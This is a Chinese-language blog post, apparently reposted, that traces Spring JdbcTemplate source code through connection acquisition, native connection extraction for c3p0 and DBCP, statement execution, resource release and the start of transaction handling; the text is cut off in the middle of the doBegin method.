        <h1 id="-spring_jdbctemplate&#x6E90;&#x7801;&#x8DDF;&#x8E2A;">.spring jdbctemplate&#x6E90;&#x7801;&#x8DDF;&#x8E2A;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 15:46:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/davidwang456/p/4542409.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/davidwang456/p/4542409.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11070001">Spring</a><a href="/topics/11070010">JDBC</a></p>
<p>&#x95F2;&#x7740;&#x6CA1;&#x4E8B;&#xFF0C;&#x770B;&#x770B;&#x6E90;&#x7801;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x4E50;&#x8DA3;!</p>
<p>java&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x57FA;&#x672C;&#x6B65;&#x9AA4;&#x90FD;&#x662F;&#x7C7B;&#x4F3C;&#x7684;&#xFF1A;</p>
<ol>
<li><p>&#x5EFA;&#x7ACB;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#xFFFD;&#xFFFD;&#xFFFD;</p>
</li>
<li><p>&#x521B;&#x5EFA;Connection</p>
</li>
<li><p>&#x521B;&#x5EFA;statement&#x6216;&#x8005;preparedStateement</p>
</li>
<li><p>&#x6267;&#x884C;sql&#xFF0C;&#x8FD4;&#x56DE;ResultSet</p>
</li>
<li><p>&#x5173;&#x95ED;resultSet</p>
</li>
</ol>
<p>5.&#x5173;&#x95ED;statement</p>
<p>6.&#x5173;&#x95ED;Connection</p>
<p>Spring&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x5728;jdbc&#x4E0A;&#x9762;&#x505A;&#x4E86;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x4F7F;&#x7528;spring&#x7684;&#x6CE8;&#x5165;&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;DataSource&#x6CE8;&#x518C;&#x5230;JdbcTemplate&#x4E4B;&#x4E2D;&#x3002;</p>
<ol>
<li><p>&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x4E09;&#x79CD;&#x5F62;&#x5F0F;</p>
<p> /**</p>
<ul>
<li>Construct a new JdbcTemplate for bean usage.</li>
<li>&lt;p&gt;Note: The DataSource has to be set before using the instance.</li>
<li><p>@see #setDataSource<br>*/<br>public JdbcTemplate() {<br>}</p>
<p>/**</p>
</li>
<li>Construct a new JdbcTemplate, given a DataSource to obtain connections from.</li>
<li>&lt;p&gt;Note: This will not trigger initialization of the exception translator.</li>
<li><p>@param dataSource the JDBC DataSource to obtain connections from<br>*/<br>public JdbcTemplate(DataSource dataSource) {<br> setDataSource(dataSource);<br> afterPropertiesSet();<br>}</p>
<p>/**</p>
</li>
<li>Construct a new JdbcTemplate, given a DataSource to obtain connections from.</li>
<li>&lt;p&gt;Note: Depending on the &quot;lazyInit&quot; flag, initialization of the exception translator</li>
<li>will be triggered.</li>
<li>@param dataSource the JDBC DataSource to obtain connections from</li>
<li>@param lazyInit whether to lazily initialize the SQLExceptionTranslator<br>*/<br>public JdbcTemplate(DataSource dataSource, boolean lazyInit) {<br> setDataSource(dataSource);<br> setLazyInit(lazyInit);<br> afterPropertiesSet();<br>}</li>
</ul>
</li>
</ol>
<p>&#x4E00;&#x79CD;&#x601D;&#x8DEF;&#xFF1A;&#x5C06;datasource&#x6CE8;&#x5165;&#x5230;JdbcTemplate&#x3002;</p>
<p>2.&#x83B7;&#x53D6;Connection</p>
<pre><code>//-------------------------------------------------------------------------
    // <span class="type">Methods</span> dealing <span class="keyword">with</span> <span class="keyword">static</span> <span class="type">SQL</span> (java.sql.<span class="type">Statement</span>)
    //-------------------------------------------------------------------------

    @<span class="type">Override</span>
    public &amp;lt;T&amp;gt; T execute(<span class="type">StatementCallback</span>&amp;lt;T&amp;gt; action) throws <span class="type">DataAccessException</span> {
        <span class="type">Assert</span>.notNull(action, &amp;quot;<span class="type">Callback</span> <span class="keyword">object</span> must <span class="keyword">not</span> be null&amp;quot;);
        <span class="type">Connection</span> con = <span class="type">DataSourceUtils</span>.getConnection(getDataSource());
        <span class="type">Statement</span> <span class="type">stmt</span> = null;
        <span class="keyword">try</span> {
            <span class="type">Connection</span> conToUse = con;
            <span class="keyword">if</span> (this.nativeJdbcExtractor != null &amp;amp;&amp;amp;
                    this.nativeJdbcExtractor.isNativeConnectionNecessaryForNativeStatements()) {
                conToUse = this.nativeJdbcExtractor.getNativeConnection(con);
            }
            <span class="type">stmt</span> = conToUse.createStatement();
            applyStatementSettings(<span class="type">stmt</span>);
            <span class="type">Statement</span> stmtToUse = <span class="type">stmt</span>;
            <span class="keyword">if</span> (this.nativeJdbcExtractor != null) {
                stmtToUse = this.nativeJdbcExtractor.getNativeStatement(<span class="type">stmt</span>);
            }
            T <span class="literal">result</span> = action.doInStatement(stmtToUse);
            handleWarnings(<span class="type">stmt</span>);
            <span class="keyword">return</span> <span class="literal">result</span>;
        }
        catch (<span class="type">SQLException</span> ex) {
            // <span class="type">Release</span> <span class="type">Connection</span> early, to avoid potential connection pool deadlock
            // <span class="keyword">in</span> the <span class="keyword">case</span> <span class="keyword">when</span> the exception translator hasn&amp;apos;t been initialized yet.
            <span class="type">JdbcUtils</span>.closeStatement(<span class="type">stmt</span>);
            <span class="type">stmt</span> = null;
            <span class="type">DataSourceUtils</span>.releaseConnection(con, getDataSource());
            con = null;
            throw getExceptionTranslator().translate(&amp;quot;<span class="type">StatementCallback</span>&amp;quot;, getSql(action), ex);
        }
        <span class="keyword">finally</span> {
            <span class="type">JdbcUtils</span>.closeStatement(<span class="type">stmt</span>);
            <span class="type">DataSourceUtils</span>.releaseConnection(con, getDataSource());
        }
    }
</code></pre><p>Connection&#x7684;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#xFF1A;</p>
<p>2.1. &#x82E5;&#x662F;datasource&#x76F4;&#x63A5;&#x4F7F;&#x7528;jdbc&#x800C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x8BF8;&#x5982;c3p0&#xFF0C;dbcp&#x7B49;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x65F6;&#x5219;&#x4ECE;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#xFF1A;</p>
<pre><code>Connection con = DataSourceUtils.getConnection<span class="params">(getDataSource<span class="params">()</span>)</span>;

<span class="comment">/**
     * Actually obtain a JDBC Connection from the given DataSource.
     * Same as {@link #getConnection}, but throwing the original SQLException.
     * &amp;lt;p&amp;gt;Is aware of a corresponding Connection bound to the current thread, for example
     * when using {@link DataSourceTransactionManager}. Will bind a Connection to the thread
     * if transaction synchronization is active (e.g. if in a JTA transaction).
     * &amp;lt;p&amp;gt;Directly accessed by {@link TransactionAwareDataSourceProxy}.
     * @param dataSource the DataSource to obtain Connections from
     * @return a JDBC Connection from the given DataSource
     * @throws SQLException if thrown by JDBC methods
     * @see #doReleaseConnection
     */</span>
    public static Connection doGetConnection<span class="params">(DataSource dataSource)</span> throws SQLException {
        Assert.notNull<span class="params">(dataSource, &amp;quot;No DataSource specified&amp;quot;)</span>;
        ConnectionHolder conHolder = <span class="params">(ConnectionHolder)</span> TransactionSynchronizationManager.getResource<span class="params">(dataSource)</span>;
        <span class="keyword">if</span> <span class="params">(conHolder != null &amp;amp;&amp;amp; <span class="params">(conHolder.hasConnection<span class="params">()</span> || conHolder.isSynchronizedWithTransaction<span class="params">()</span>)</span>)</span> {
            conHolder.requested<span class="params">()</span>;
            <span class="keyword">if</span> <span class="params">(!conHolder.hasConnection<span class="params">()</span>)</span> {
                logger.debug<span class="params">(&amp;quot;Fetching resumed JDBC Connection from DataSource&amp;quot;)</span>;
                conHolder.setConnection<span class="params">(dataSource.getConnection<span class="params">()</span>)</span>;
            }
            return conHolder.getConnection<span class="params">()</span>;
        }
        <span class="comment">// Else we either got no holder or an empty thread-bound holder here.</span>

        logger.debug<span class="params">(&amp;quot;Fetching JDBC Connection from DataSource&amp;quot;)</span>;
        Connection con = dataSource.getConnection<span class="params">()</span>;
        <span class="keyword">if</span> <span class="params">(TransactionSynchronizationManager.isSynchronizationActive<span class="params">()</span>)</span> {
            logger.debug<span class="params">(&amp;quot;Registering transaction synchronization for JDBC Connection&amp;quot;)</span>;
            <span class="comment">// Use same Connection for further JDBC actions within the transaction.</span>
            <span class="comment">// Thread-bound object will get removed by synchronization at transaction completion.</span>
            ConnectionHolder holderToUse = conHolder;
            <span class="keyword">if</span> <span class="params">(holderToUse == null)</span> {
                holderToUse = new ConnectionHolder<span class="params">(con)</span>;
            }
            <span class="keyword">else</span> {
                holderToUse.setConnection<span class="params">(con)</span>;
            }
            holderToUse.requested<span class="params">()</span>;
            TransactionSynchronizationManager.registerSynchronization<span class="params">(
                    new ConnectionSynchronization<span class="params">(holderToUse, dataSource)</span>)</span>;
            holderToUse.setSynchronizedWithTransaction<span class="params">(<span class="literal">true</span>)</span>;
            <span class="keyword">if</span> <span class="params">(holderToUse != conHolder)</span> {
                TransactionSynchronizationManager.bindResource<span class="params">(dataSource, holderToUse)</span>;
            }
        }
        return con;
    }
</code></pre><p>ConnectionHolder&#x95F4;&#x63A5;&#x7EE7;&#x627F;&#x4E86;ResourceHolder&#x63A5;&#x53E3;&#xFF0C;ResourceHolder&#x63A5;&#x53E3;&#x5141;&#x8BB8;spring&#x7684;&#x4E8B;&#x52A1;&#x57FA;&#x7840;&#x53EF;&#x4EE5;&#x5728;&#x5FC5;&#x8981;&#x65F6;&#x68C0;&#x7D22;&#x548C;&#x91CD;&#x7F6E;&#x3002;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x7EE7;&#x627F;ResourceHolderSupport&#x5373;&#x53EF;&#x3002;</p>
<p>2.2. &#x82E5;&#x4F7F;&#x7528;&#x4E86;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x65F6;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4ECE;&#x63D2;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;Connection&#x3002;</p>
<pre><code>conToUse = <span class="keyword">this</span>.nativeJdbcExtractor.getNativeConnection(con);
</code></pre><p>&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x7684;&#x5173;&#x7CFB;&#x5982;&#x4E0B;&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2f019aa.jpg" alt=""></p>
<p>&#x5176;&#x5177;&#x4F53;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code><span class="comment">/**
     * Check for a ConnectionProxy chain, then delegate to doGetNativeConnection.
     * &amp;lt;p&amp;gt;ConnectionProxy is used by Spring&amp;apos;s TransactionAwareDataSourceProxy
     * and LazyConnectionDataSourceProxy. The target connection behind it is
     * typically one from a local connection pool, to be unwrapped by the
     * doGetNativeConnection implementation of a concrete subclass.
     * <span class="doctag">@see</span> #doGetNativeConnection
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.ConnectionProxy
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.DataSourceUtils#getTargetConnection
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.TransactionAwareDataSourceProxy
     * <span class="doctag">@see</span> org.springframework.jdbc.datasource.LazyConnectionDataSourceProxy
     */</span>
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="function">Connection <span class="title">getNativeConnection</span><span class="params">(Connection con)</span> <span class="keyword">throws</span> SQLException </span>{
        <span class="keyword">if</span> (con == <span class="keyword">null</span>) {
            <span class="keyword">return</span> <span class="keyword">null</span>;
        }
        Connection targetCon = DataSourceUtils.getTargetConnection(con);
        Connection nativeCon = doGetNativeConnection(targetCon);
        <span class="keyword">if</span> (nativeCon == targetCon) {
            <span class="comment">// We haven&amp;apos;t received a different Connection, so we&amp;apos;ll assume that there&amp;apos;s</span>
            <span class="comment">// some additional proxying going on. Let&amp;apos;s check whether we get something</span>
            <span class="comment">// different back from the DatabaseMetaData.getConnection() call.</span>
            DatabaseMetaData metaData = targetCon.getMetaData();
            <span class="comment">// The following check is only really there for mock Connections</span>
            <span class="comment">// which might not carry a DatabaseMetaData instance.</span>
            <span class="keyword">if</span> (metaData != <span class="keyword">null</span>) {
                Connection metaCon = metaData.getConnection();
                <span class="keyword">if</span> (metaCon != <span class="keyword">null</span> &amp;amp;&amp;amp; metaCon != targetCon) {
                    <span class="comment">// We&amp;apos;ve received a different Connection there:</span>
                    <span class="comment">// Let&amp;apos;s retry the native extraction process with it.</span>
                    nativeCon = doGetNativeConnection(metaCon);
                }
            }
        }
        <span class="keyword">return</span> nativeCon;
    }
</code></pre><p>&#x5177;&#x4F53;&#x7684;&#x5B9E;&#x73B0;&#x5728;&#x5176;&#x5B50;&#x7C7B;&#x91CC;&#x9762;&#xFF0C;&#x4EE5;c3p0&#x4E3A;&#x4F8B;&#xFF1A;</p>
<pre><code><span class="comment">/**
 * Retrieve the Connection via C3P0&amp;apos;s {<span class="doctag">@code</span> rawConnectionOperation} API,
 * using the {<span class="doctag">@code</span> getRawConnection} as callback to get access to the
 * raw Connection (which is otherwise not directly supported by C3P0).
 * <span class="doctag">@see</span> #getRawConnection
 */</span>
<span class="annotation">@Override</span>
<span class="keyword">protected</span> <span class="function">Connection <span class="title">doGetNativeConnection</span><span class="params">(Connection con)</span> <span class="keyword">throws</span> SQLException </span>{
    <span class="keyword">if</span> (con <span class="keyword">instanceof</span> C3P0ProxyConnection) {
        C3P0ProxyConnection cpCon = (C3P0ProxyConnection) con;
        <span class="keyword">try</span> {
            <span class="keyword">return</span> (Connection) cpCon.rawConnectionOperation(
                    <span class="keyword">this</span>.getRawConnectionMethod, <span class="keyword">null</span>, <span class="keyword">new</span> Object[] {C3P0ProxyConnection.RAW_CONNECTION});
        }
        <span class="keyword">catch</span> (SQLException ex) {
            <span class="keyword">throw</span> ex;
        }
        <span class="keyword">catch</span> (Exception ex) {
            ReflectionUtils.handleReflectionException(ex);
        }
    }
    <span class="keyword">return</span> con;
}
</code></pre><p>&#x8C03;&#x7528;C3P0 API&#x83B7;&#x53D6;Connection&#x3002;</p>
<ol>
<li><p>&#x521B;&#x5EFA;Statement</p>
<p> stmt = conToUse.createStatement();</p>
<pre><code><span class="label">applyStatementSettings</span>(<span class="keyword">stmt);
</span><span class="label">Statement</span> <span class="keyword">stmtToUse </span>= <span class="keyword">stmt;
</span><span class="label">if</span> (this.nativeJdbcExtractor != null) {
    <span class="keyword">stmtToUse </span>= this.nativeJdbcExtractor.getNativeStatement(<span class="keyword">stmt);
</span>}  
</code></pre><p>3.1 &#x4E0D;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<p> /**</p>
<ul>
<li>Prepare the given JDBC Statement (or PreparedStatement or CallableStatement),</li>
<li>applying statement settings such as fetch size, max rows, and query timeout.</li>
<li>@param stmt the JDBC Statement to prepare</li>
<li>@throws SQLException if thrown by JDBC API</li>
<li>@see #setFetchSize</li>
<li>@see #setMaxRows</li>
<li>@see #setQueryTimeout</li>
<li>@see org.springframework.jdbc.datasource.DataSourceUtils#applyTransactionTimeout<br>*/<br>protected void applyStatementSettings(Statement stmt) throws SQLException {<br> int fetchSize = getFetchSize();<br> if (fetchSize &gt; 0) {<pre><code><span class="tag">stmt</span><span class="class">.setFetchSize</span>(<span class="tag">fetchSize</span>);
</code></pre> }<br> int maxRows = getMaxRows();<br> if (maxRows &gt; 0) {<pre><code>stmt.<span class="built_in">set</span>MaxRows(<span class="keyword">max</span>Rows);
</code></pre> }<br> DataSourceUtils.applyTimeout(stmt, getDataSource(), getQueryTimeout());<br>}</li>
</ul>
</li>
</ol>
<p>&#x8BBE;&#x7F6E;fetch size, max rows, and query timeout.&#x5176;&#x4E2D;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x5728;datasourceUtils&#x4E2D;&#x5B9E;&#x73B0;&#x3002;</p>
<pre><code><span class="comment">/**
    * Apply the specified timeout - overridden by the current transaction timeout,
    * if any - to the given JDBC Statement object.
    * <span class="doctag">@param</span> stmt the JDBC Statement object
    * <span class="doctag">@param</span> dataSource the DataSource that the Connection was obtained from
    * <span class="doctag">@param</span> timeout the timeout to apply (or 0 for no timeout outside of a transaction)
    * <span class="doctag">@throws</span> SQLException if thrown by JDBC methods
    * <span class="doctag">@see</span> java.sql.Statement#setQueryTimeout
    */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">applyTimeout</span><span class="params">(Statement stmt, DataSource dataSource, <span class="keyword">int</span> timeout)</span> <span class="keyword">throws</span> SQLException </span>{
       Assert.notNull(stmt, &amp;quot;No Statement specified&amp;quot;);
       Assert.notNull(dataSource, &amp;quot;No DataSource specified&amp;quot;);
       ConnectionHolder holder = (ConnectionHolder) TransactionSynchronizationManager.getResource(dataSource);
       <span class="keyword">if</span> (holder != <span class="keyword">null</span> &amp;amp;&amp;amp; holder.hasTimeout()) {
          <span class="comment">// Remaining transaction timeout overrides specified value.</span>
          stmt.setQueryTimeout(holder.getTimeToLiveInSeconds());
       }
       <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">(timeout &amp;gt; <span class="number">0</span>)</span> </span>{
          <span class="comment">// No current transaction timeout -&amp;gt; apply specified value.</span>
          stmt.setQueryTimeout(timeout);
       }
    }
</code></pre><p>3.2 &#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<p>&#x4EE5;c3p0&#x4E3A;&#x4F8B;</p>
<pre><code><span class="comment">/**
 * Extracts the innermost delegate from the given Commons DBCP object.
 * Falls back to the given object if no underlying object found.
 * @param obj the Commons DBCP Connection/Statement/ResultSet
 * @return the underlying native Connection/Statement/ResultSet
 */</span>
<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getInnermostDelegate</span>(<span class="params">Object obj</span>) throws SQLException </span>{
    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) {
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="keyword">try</span> {
        Class&amp;lt;?&amp;gt; classToAnalyze = obj.getClass();
        <span class="keyword">while</span> (!Modifier.isPublic(classToAnalyze.getModifiers())) {
            classToAnalyze = classToAnalyze.getSuperclass();
            <span class="keyword">if</span> (classToAnalyze == <span class="keyword">null</span>) {
                <span class="comment">// No public provider class found -&amp;gt; fall back to given object.</span>
                <span class="keyword">return</span> obj;
            }
        }
        Method getInnermostDelegate = classToAnalyze.getMethod(GET_INNERMOST_DELEGATE_METHOD_NAME, (Class[]) <span class="keyword">null</span>);
        Object <span class="keyword">delegate</span> = ReflectionUtils.invokeJdbcMethod(getInnermostDelegate, obj);
        <span class="keyword">return</span> (<span class="keyword">delegate</span> != <span class="keyword">null</span> ? <span class="keyword">delegate</span> : obj);
    }
    <span class="keyword">catch</span> (NoSuchMethodException ex) {
        <span class="keyword">return</span> obj;
    }
    <span class="keyword">catch</span> (SecurityException ex) {
        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(&amp;quot;Commons DBCP getInnermostDelegate method <span class="keyword">is</span> not accessible: &amp;quot; + ex);
    }
}
</code></pre><ol>
<li><p>&#x6267;&#x884C;statement&#x5E76;&#x5173;&#x95ED;&#x4E4B;</p>
<p> T result = action.doInStatement(stmtToUse);</p>
<p> class QueryStatementCallback implements StatementCallback&lt;T&gt;, SqlProvider {</p>
<pre><code><span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="function">T <span class="title">doInStatement</span><span class="params">(Statement stmt)</span> <span class="keyword">throws</span> SQLException </span>{
    ResultSet rs = <span class="keyword">null</span>;
    <span class="keyword">try</span> {
        rs = stmt.executeQuery(sql);
        ResultSet rsToUse = rs;
        <span class="keyword">if</span> (nativeJdbcExtractor != <span class="keyword">null</span>) {
            rsToUse = nativeJdbcExtractor.getNativeResultSet(rs);
        }
        <span class="function"><span class="keyword">return</span> rse.<span class="title">extractData</span><span class="params">(rsToUse)</span></span>;
    }
    <span class="keyword">finally</span> {
        JdbcUtils.closeResultSet(rs);
    }
}
<span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="function">String <span class="title">getSql</span><span class="params">()</span> </span>{
    <span class="keyword">return</span> sql;
}
</code></pre><p> }</p>
</li>
</ol>
<p>4.1 &#x4E0D;&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<pre><code>rs = stmt.executeQuery(sql)<span class="comment">;</span>
</code></pre><p>4.2 &#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;</p>
<pre><code><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> GET_INNERMOST_DELEGATE_METHOD_NAME = &amp;quot;getInnermostDelegate&amp;quot;;
<span class="comment">/**
 * Extracts the innermost delegate from the given Commons DBCP object.
 * Falls back to the given object if no underlying object found.
 * @param obj the Commons DBCP Connection/Statement/ResultSet
 * @return the underlying native Connection/Statement/ResultSet
 */</span>
<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">Object</span> getInnermostDelegate(<span class="keyword">Object</span> obj) <span class="keyword">throws</span> SQLException {
    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) {
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="keyword">try</span> {
        Class&amp;lt;?&amp;gt; classToAnalyze = obj.getClass();
        <span class="keyword">while</span> (!Modifier.isPublic(classToAnalyze.getModifiers())) {
            classToAnalyze = classToAnalyze.getSuperclass();
            <span class="keyword">if</span> (classToAnalyze == <span class="keyword">null</span>) {
                <span class="comment">// No public provider class found -&amp;gt; fall back to given object.</span>
                <span class="keyword">return</span> obj;
            }
        }
        Method getInnermostDelegate = classToAnalyze.getMethod(GET_INNERMOST_DELEGATE_METHOD_NAME, (Class[]) <span class="keyword">null</span>);
        <span class="keyword">Object</span> delegate = ReflectionUtils.invokeJdbcMethod(getInnermostDelegate, obj);
        <span class="keyword">return</span> (delegate != <span class="keyword">null</span> ? delegate : obj);
    }
    <span class="keyword">catch</span> (NoSuchMethodException ex) {
        <span class="keyword">return</span> obj;
    }
    <span class="keyword">catch</span> (SecurityException ex) {
        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(&amp;quot;Commons DBCP getInnermostDelegate method is not accessible: &amp;quot; + ex);
    }
}
</code></pre><p>4.3 &#x63D0;&#x53D6;&#x6570;&#x636E;</p>
<pre><code>    @Override
<span class="keyword">public</span> <span class="built_in">List</span><span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>; extractData(<span class="keyword">ResultSet</span> rs) throws SQLException {
    <span class="built_in">List</span><span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>; results <span class="subst">=</span> (this<span class="built_in">.</span>rowsExpected <span class="subst">&amp;</span><span class="literal">gt</span>; <span class="number">0</span> <span class="subst">?</span> <span class="literal">new</span> ArrayList<span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>;(this<span class="built_in">.</span>rowsExpected) : <span class="literal">new</span> ArrayList<span class="subst">&amp;</span><span class="literal">lt</span>;T<span class="subst">&amp;</span><span class="literal">gt</span>;());
    int rowNum <span class="subst">=</span> <span class="number">0</span>;
    <span class="keyword">while</span> (rs<span class="built_in">.</span>next()) {
        results<span class="built_in">.</span>add(this<span class="built_in">.</span>rowMapper<span class="built_in">.</span>mapRow(rs, rowNum<span class="subst">++</span>));
    }
    <span class="keyword">return</span> results;
}
</code></pre><p>&#x6216;&#x8005;</p>
<pre><code>    <span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="function">SqlRowSet <span class="title">extractData</span><span class="params">(ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>{
    <span class="function"><span class="keyword">return</span> <span class="title">createSqlRowSet</span><span class="params">(rs)</span></span>;
}

<span class="comment">/**
 * Create a SqlRowSet that wraps the given ResultSet,
 * representing its data in a disconnected fashion.
 * &amp;lt;p&amp;gt;This implementation creates a Spring ResultSetWrappingSqlRowSet
 * instance that wraps a standard JDBC CachedRowSet instance.
 * Can be overridden to use a different implementation.
 * <span class="doctag">@param</span> rs the original ResultSet (connected)
 * <span class="doctag">@return</span> the disconnected SqlRowSet
 * <span class="doctag">@throws</span> SQLException if thrown by JDBC methods
 * <span class="doctag">@see</span> #newCachedRowSet
 * <span class="doctag">@see</span> org.springframework.jdbc.support.rowset.ResultSetWrappingSqlRowSet
 */</span>
<span class="keyword">protected</span> <span class="function">SqlRowSet <span class="title">createSqlRowSet</span><span class="params">(ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>{
    CachedRowSet rowSet = newCachedRowSet();
    rowSet.populate(rs);
    <span class="keyword">return</span> <span class="keyword">new</span> ResultSetWrappingSqlRowSet(rowSet);
}
</code></pre><p>4.4 &#x5173;&#x95ED;ResultSet</p>
<pre><code>/**
 * Close the given JDBC ResultSet <span class="keyword">and</span> ignore any thrown <span class="keyword">exception</span>.
 * This is useful <span class="keyword">for</span> typical <span class="keyword">finally</span> blocks <span class="keyword">in</span> manual JDBC code.
 * @param rs the JDBC ResultSet <span class="keyword">to</span> close (may be {@code <span class="keyword">null</span>})
 */
<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> closeResultSet(ResultSet rs) {
    <span class="keyword">if</span> (rs != <span class="keyword">null</span>) {
        <span class="keyword">try</span> {
            rs.close();
        }
        catch (SQLException ex) {
            logger.trace(&amp;quot;Could not close JDBC ResultSet&amp;quot;, ex);
        }
        catch (Throwable ex) {
            <span class="comment">// We don&amp;apos;t trust the JDBC driver: It might throw RuntimeException or Error.</span>
            logger.trace(&amp;quot;Unexpected <span class="keyword">exception</span> on closing JDBC ResultSet&amp;quot;, ex);
        }
    }
}
</code></pre><ol>
<li><p>&#x91CA;&#x653E;connection</p>
<p> /**</p>
<pre><code> * Close the given Connection, obtained from the given DataSource,
 * <span class="keyword">if</span> it is not managed externally (that is, not bound to the thread).
 * <span class="annotation">@param</span> con the Connection to close <span class="keyword">if</span> necessary
 * (<span class="keyword">if</span> <span class="keyword">this</span> is {<span class="annotation">@code</span> <span class="keyword">null</span>}, the call will be ignored)
 * <span class="annotation">@param</span> dataSource the DataSource that the Connection was obtained from
 * (may be {<span class="annotation">@code</span> <span class="keyword">null</span>})
 * <span class="annotation">@see</span> #getConnection
 */
<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">releaseConnection</span><span class="params">(Connection con, DataSource dataSource)</span> </span>{
    <span class="keyword">try</span> {
        doReleaseConnection(con, dataSource);
    }
    <span class="keyword">catch</span> (SQLException ex) {
        logger.debug(&amp;quot;Could not close JDBC Connection&amp;quot;, ex);
    }
    <span class="keyword">catch</span> (Throwable ex) {
        logger.debug(&amp;quot;Unexpected exception on closing JDBC Connection&amp;quot;, ex);
    }
}
<span class="comment">/**
 * Actually close the given Connection, obtained from the given DataSource.
 * Same as {<span class="doctag">@link</span> #releaseConnection}, but throwing the original SQLException.
 * &amp;lt;p&amp;gt;Directly accessed by {<span class="doctag">@link</span> TransactionAwareDataSourceProxy}.
 * <span class="doctag">@param</span> con the Connection to close if necessary
 * (if this is {<span class="doctag">@code</span> null}, the call will be ignored)
 * <span class="doctag">@param</span> dataSource the DataSource that the Connection was obtained from
 * (may be {<span class="doctag">@code</span> null})
 * <span class="doctag">@throws</span> SQLException if thrown by JDBC methods
 * <span class="doctag">@see</span> #doGetConnection
 */</span>
<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">doReleaseConnection</span><span class="params">(Connection con, DataSource dataSource)</span> <span class="keyword">throws</span> SQLException </span>{
    <span class="keyword">if</span> (con == <span class="keyword">null</span>) {
        <span class="keyword">return</span>;
    }
    <span class="keyword">if</span> (dataSource != <span class="keyword">null</span>) {
        ConnectionHolder conHolder = (ConnectionHolder) TransactionSynchronizationManager.getResource(dataSource);
        <span class="keyword">if</span> (conHolder != <span class="keyword">null</span> &amp;amp;&amp;amp; connectionEquals(conHolder, con)) {
            <span class="comment">// It&amp;apos;s the transactional Connection: Don&amp;apos;t close it.</span>
            conHolder.released();
            <span class="keyword">return</span>;
        }
    }
    logger.debug(&amp;quot;Returning JDBC Connection to DataSource&amp;quot;);
    doCloseConnection(con, dataSource);
}
</code></pre></li>
</ol>
<p>6.&#x4E8B;&#x52A1;&#x5904;&#x7406;</p>
<p>6.1 &#x4E8B;&#x52A1;&#x5F00;&#x59CB;</p>
<p>DataSourceTransactionManager&#xA0;&#x7684;doBegin()&#x65B9;&#x6CD5;</p>
<pre><code><span class="comment">/**
 * This implementation sets the isolation level but ignores the timeout.
 */</span>
@Override
protected void doBegin<span class="params">(Object transaction, TransactionDefinition definition)</span> {
    DataSourceTransactionObject txObject = <span class="params">(DataSourceTransactionObject)</span> transaction;
    Connection con = null;
    try {
        <span class="keyword">if</span> <span class="params">(txObject.getConnectionHolder<span class="params">()</span> == null ||
                txObject.getConnectionHolder<span class="params">()</span>.isSynchronizedWithTransaction<span class="params">()</span>)</span> {
            Connection newCon = this.dataSource.getConnection<span class="params">()</span>;
            <span class="keyword">if</span> <span class="params">(logger.isDebugEnabled<span class="params">()</span>)</span> {
